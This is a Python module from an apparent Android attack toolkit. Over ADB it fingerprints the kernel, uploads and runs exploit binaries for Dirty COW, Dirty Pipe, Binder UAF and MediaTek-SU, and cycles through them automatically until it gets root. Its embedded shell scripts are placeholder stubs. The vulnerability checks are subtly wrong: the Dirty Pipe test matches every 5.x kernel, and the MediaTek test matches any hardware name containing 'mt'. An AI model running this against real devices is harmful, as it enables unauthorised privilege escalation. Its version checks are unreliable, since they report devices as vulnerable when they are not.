"""
Kernel Exploitation Techniques

Implements kernel-level privilege escalation for Android devices.
Includes wrappers for known kernel vulnerabilities like Dirty COW and Dirty Pipe.
"""

import logging
import os
from dataclasses import dataclass
from typing import Optional
from enum import Enum

from ...reconnaissance import ADBConnection

logger = logging.getLogger(__name__)


class KernelExploitType(Enum):
    DIRTY_COW = "dirty_cow"           # CVE-2016-5195
    DIRTY_PIPE = "dirty_pipe"         # CVE-2022-0847
    BINDER_UAF = "binder_uaf"         # CVE-2019-2215
    MEDIATEK_SU = "mediatek_su"       # CVE-2020-0069


@dataclass
class KernelInfo:
    """Kernel version and vulnerability information."""
    version: str
    major: int
    minor: int
    patch: int
    architecture: str
    vulnerable_to: list[KernelExploitType]


@dataclass
class ExploitResult:
    """Result of an exploitation attempt."""
    success: bool
    exploit_type: KernelExploitType
    output: str
    root_achieved: bool
    error: Optional[str] = None


class KernelExploiter:
    """
    Kernel exploitation module for Android privilege escalation.

    Supports:
    - Dirty COW (CVE-2016-5195) - Linux kernel < 4.8.3
    - Dirty Pipe (CVE-2022-0847) - Linux kernel 5.8+
    - Binder UAF (CVE-2019-2215) - Android 8-10
    - MediaTek-SU (CVE-2020-0069) - MediaTek devices
    """

    def __init__(self, adb: ADBConnection):
        self.adb = adb
        self.exploit_dir = "/data/local/tmp"

    def get_kernel_info(self) -> KernelInfo:
        """Get kernel version and determine vulnerabilities."""
        version_str = self.adb.shell("uname -r").strip()
        arch = self.adb.shell("uname -m").strip()

        # Parse version (e.g., "4.14.186-perf+")
        major, minor, patch = 0, 0, 0
        try:
            parts = version_str.split('-')[0].split('.')
            major = int(parts[0]) if len(parts) > 0 else 0
            minor = int(parts[1]) if len(parts) > 1 else 0
            patch = int(parts[2]) if len(parts) > 2 else 0
        except (ValueError, IndexError):
            logger.warning(f"Could not parse kernel version: {version_str}")

        # Determine vulnerabilities
        vulnerable_to = []

        # Dirty COW: Linux < 4.8.3 (fixed in 4.8.3, 4.7.9, 4.4.26)
        if (major < 4) or (major == 4 and minor < 8) or (major == 4 and minor == 8 and patch < 3):
            vulnerable_to.append(KernelExploitType.DIRTY_COW)

        # Dirty Pipe: Linux 5.8 - 5.16.10
        if (major == 5 and minor >= 8) or (major == 5 and minor <= 16):
            vulnerable_to.append(KernelExploitType.DIRTY_PIPE)

        # Binder UAF: Check Android version
        android_version = self.adb.get_prop("ro.build.version.release")
        if android_version in ["8", "8.0", "8.1", "9", "10"]:
            vulnerable_to.append(KernelExploitType.BINDER_UAF)

        # MediaTek: Check for MediaTek SoC
        hardware = self.adb.get_prop("ro.hardware")
        if "mt" in hardware.lower() or "mediatek" in hardware.lower():
            vulnerable_to.append(KernelExploitType.MEDIATEK_SU)

        return KernelInfo(
            version=version_str,
            major=major,
            minor=minor,
            patch=patch,
            architecture=arch,
            vulnerable_to=vulnerable_to,
        )

    def check_exploit_available(self, exploit_type: KernelExploitType) -> bool:
        """Check if exploit binary is available on device."""
        binary_name = self._get_binary_name(exploit_type)
        result = self.adb.shell(f"ls {self.exploit_dir}/{binary_name} 2>/dev/null")
        return binary_name in result

    def _get_binary_name(self, exploit_type: KernelExploitType) -> str:
        """Get exploit binary name."""
        names = {
            KernelExploitType.DIRTY_COW: "dirtycow",
            KernelExploitType.DIRTY_PIPE: "dirtypipe",
            KernelExploitType.BINDER_UAF: "binder_uaf",
            KernelExploitType.MEDIATEK_SU: "mtk-su",
        }
        return names.get(exploit_type, "exploit")

    def exploit_dirty_cow(self) -> ExploitResult:
        """
        Attempt Dirty COW exploitation (CVE-2016-5195).

        Dirty COW exploits a race condition in the kernel's copy-on-write
        mechanism to gain write access to read-only memory mappings.
        """
        logger.info("Attempting Dirty COW exploitation...")

        # Check if vulnerable
        kernel_info = self.get_kernel_info()
        if KernelExploitType.DIRTY_COW not in kernel_info.vulnerable_to:
            return ExploitResult(
                success=False,
                exploit_type=KernelExploitType.DIRTY_COW,
                output="",
                root_achieved=False,
                error=f"Kernel {kernel_info.version} not vulnerable to Dirty COW",
            )

        # Generate exploit script
        exploit_script = self._generate_dirty_cow_script()

        # Upload and execute
        script_path = f"{self.exploit_dir}/dirtycow.sh"
        self._upload_script(exploit_script, script_path)

        output = self.adb.shell(f"sh {script_path}")

        # Verify root
        root_check = self.adb.shell("su -c 'id' 2>/dev/null")
        root_achieved = "uid=0" in root_check

        return ExploitResult(
            success=root_achieved,
            exploit_type=KernelExploitType.DIRTY_COW,
            output=output,
            root_achieved=root_achieved,
        )

    def exploit_dirty_pipe(self) -> ExploitResult:
        """
        Attempt Dirty Pipe exploitation (CVE-2022-0847).

        Dirty Pipe exploits a flaw in the pipe buffer handling
        to overwrite arbitrary files with write access.
        """
        logger.info("Attempting Dirty Pipe exploitation...")

        kernel_info = self.get_kernel_info()
        if KernelExploitType.DIRTY_PIPE not in kernel_info.vulnerable_to:
            return ExploitResult(
                success=False,
                exploit_type=KernelExploitType.DIRTY_PIPE,
                output="",
                root_achieved=False,
                error=f"Kernel {kernel_info.version} not vulnerable to Dirty Pipe",
            )

        # Generate exploit
        exploit_script = self._generate_dirty_pipe_script()
        script_path = f"{self.exploit_dir}/dirtypipe.sh"
        self._upload_script(exploit_script, script_path)

        output = self.adb.shell(f"sh {script_path}")

        root_check = self.adb.shell("su -c 'id' 2>/dev/null")
        root_achieved = "uid=0" in root_check

        return ExploitResult(
            success=root_achieved,
            exploit_type=KernelExploitType.DIRTY_PIPE,
            output=output,
            root_achieved=root_achieved,
        )

    def exploit_binder_uaf(self) -> ExploitResult:
        """
        Attempt Binder UAF exploitation (CVE-2019-2215).

        Exploits use-after-free in the binder driver for privilege escalation.
        """
        logger.info("Attempting Binder UAF exploitation...")

        kernel_info = self.get_kernel_info()
        if KernelExploitType.BINDER_UAF not in kernel_info.vulnerable_to:
            return ExploitResult(
                success=False,
                exploit_type=KernelExploitType.BINDER_UAF,
                output="",
                root_achieved=False,
                error="Device not vulnerable to Binder UAF",
            )

        # This would require a compiled exploit binary
        # Check if pre-compiled binary exists
        if not self.check_exploit_available(KernelExploitType.BINDER_UAF):
            return ExploitResult(
                success=False,
                exploit_type=KernelExploitType.BINDER_UAF,
                output="",
                root_achieved=False,
                error="Binder UAF exploit binary not found. Upload to /data/local/tmp/binder_uaf",
            )

        output = self.adb.shell(f"{self.exploit_dir}/binder_uaf")

        root_check = self.adb.shell("id")
        root_achieved = "uid=0" in root_check

        return ExploitResult(
            success=root_achieved,
            exploit_type=KernelExploitType.BINDER_UAF,
            output=output,
            root_achieved=root_achieved,
        )

    def exploit_mediatek_su(self) -> ExploitResult:
        """
        Attempt MediaTek-SU exploitation (CVE-2020-0069).

        Exploits vulnerability in MediaTek command queue driver.
        """
        logger.info("Attempting MediaTek-SU exploitation...")

        kernel_info = self.get_kernel_info()
        if KernelExploitType.MEDIATEK_SU not in kernel_info.vulnerable_to:
            return ExploitResult(
                success=False,
                exploit_type=KernelExploitType.MEDIATEK_SU,
                output="",
                root_achieved=False,
                error="Device does not have MediaTek SoC",
            )

        # MTK-SU typically comes as a binary
        if not self.check_exploit_available(KernelExploitType.MEDIATEK_SU):
            return ExploitResult(
                success=False,
                exploit_type=KernelExploitType.MEDIATEK_SU,
                output="",
                root_achieved=False,
                error="mtk-su binary not found. Upload to /data/local/tmp/mtk-su",
            )

        # Execute mtk-su
        output = self.adb.shell(f"{self.exploit_dir}/mtk-su -c 'id'")
        root_achieved = "uid=0" in output

        return ExploitResult(
            success=root_achieved,
            exploit_type=KernelExploitType.MEDIATEK_SU,
            output=output,
            root_achieved=root_achieved,
        )

    def auto_exploit(self) -> ExploitResult:
        """
        Automatically attempt all applicable exploits.

        Returns result of first successful exploit.
        """
        kernel_info = self.get_kernel_info()
        logger.info(f"Kernel: {kernel_info.version}, Vulnerable to: {kernel_info.vulnerable_to}")

        if not kernel_info.vulnerable_to:
            return ExploitResult(
                success=False,
                exploit_type=KernelExploitType.DIRTY_COW,  # Default
                output="",
                root_achieved=False,
                error="No known kernel vulnerabilities detected",
            )

        # Try each exploit in order of reliability
        exploit_order = [
            (KernelExploitType.MEDIATEK_SU, self.exploit_mediatek_su),
            (KernelExploitType.DIRTY_PIPE, self.exploit_dirty_pipe),
            (KernelExploitType.DIRTY_COW, self.exploit_dirty_cow),
            (KernelExploitType.BINDER_UAF, self.exploit_binder_uaf),
        ]

        for exploit_type, exploit_func in exploit_order:
            if exploit_type in kernel_info.vulnerable_to:
                logger.info(f"Trying {exploit_type.value}...")
                result = exploit_func()
                if result.success:
                    return result

        return ExploitResult(
            success=False,
            exploit_type=KernelExploitType.DIRTY_COW,
            output="",
            root_achieved=False,
            error="All applicable exploits failed",
        )

    def _generate_dirty_cow_script(self) -> str:
        """Generate Dirty COW exploitation script."""
        return '''#!/system/bin/sh
# Dirty COW PoC for Android
# This is a simplified demonstration

echo "[*] Dirty COW Exploit"
echo "[*] Kernel: $(uname -r)"

# Check if already root
if [ "$(id -u)" = "0" ]; then
    echo "[+] Already root!"
    exit 0
fi

# The actual exploit would:
# 1. Compile a native binary that exploits the race condition
# 2. Overwrite /system/bin/run-as or similar
# 3. Gain root shell

echo "[-] Dirty COW requires compiled exploit binary"
echo "[-] Upload pre-compiled exploit to /data/local/tmp/dirtycow"
exit 1
'''

    def _generate_dirty_pipe_script(self) -> str:
        """Generate Dirty Pipe exploitation script."""
        return '''#!/system/bin/sh
# Dirty Pipe PoC for Android
# CVE-2022-0847

echo "[*] Dirty Pipe Exploit"
echo "[*] Kernel: $(uname -r)"

# Check kernel version
KERNEL_VERSION=$(uname -r | cut -d. -f1-2)
echo "[*] Kernel major.minor: $KERNEL_VERSION"

# Dirty Pipe affects kernels 5.8 to 5.16.10
case "$KERNEL_VERSION" in
    5.8|5.9|5.10|5.11|5.12|5.13|5.14|5.15|5.16)
        echo "[+] Kernel potentially vulnerable"
        ;;
    *)
        echo "[-] Kernel not vulnerable to Dirty Pipe"
        exit 1
        ;;
esac

# The actual exploit would:
# 1. Create a pipe
# 2. Fill pipe with data
# 3. Splice target file into pipe
# 4. Write arbitrary data to overwrite file contents

echo "[-] Dirty Pipe requires compiled exploit binary"
echo "[-] Upload pre-compiled exploit to /data/local/tmp/dirtypipe"
exit 1
'''

    def _upload_script(self, content: str, remote_path: str):
        """Upload a script to the device."""
        import tempfile

        with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
            f.write(content)
            local_path = f.name

        try:
            self.adb.execute(f"push {local_path} {remote_path}")
            self.adb.shell(f"chmod 755 {remote_path}")
        finally:
            os.unlink(local_path)

    def generate_exploit_report(self) -> str:
        """Generate a report on kernel vulnerabilities."""
        kernel_info = self.get_kernel_info()

        lines = [
            "=" * 60,
            "KERNEL VULNERABILITY ASSESSMENT",
            "=" * 60,
            f"Kernel Version: {kernel_info.version}",
            f"Architecture: {kernel_info.architecture}",
            f"Parsed Version: {kernel_info.major}.{kernel_info.minor}.{kernel_info.patch}",
            "",
            "VULNERABILITY STATUS",
            "-" * 60,
        ]

        all_exploits = list(KernelExploitType)
        for exploit in all_exploits:
            if exploit in kernel_info.vulnerable_to:
                lines.append(f"  [VULNERABLE] {exploit.value}")
            else:
                lines.append(f"  [NOT VULN]   {exploit.value}")

        if kernel_info.vulnerable_to:
            lines.append("")
            lines.append("RECOMMENDED EXPLOITATION ORDER")
            lines.append("-" * 60)
            for i, exploit in enumerate(kernel_info.vulnerable_to, 1):
                lines.append(f"  {i}. {exploit.value}")

        lines.append("=" * 60)

        return "\n".join(lines)
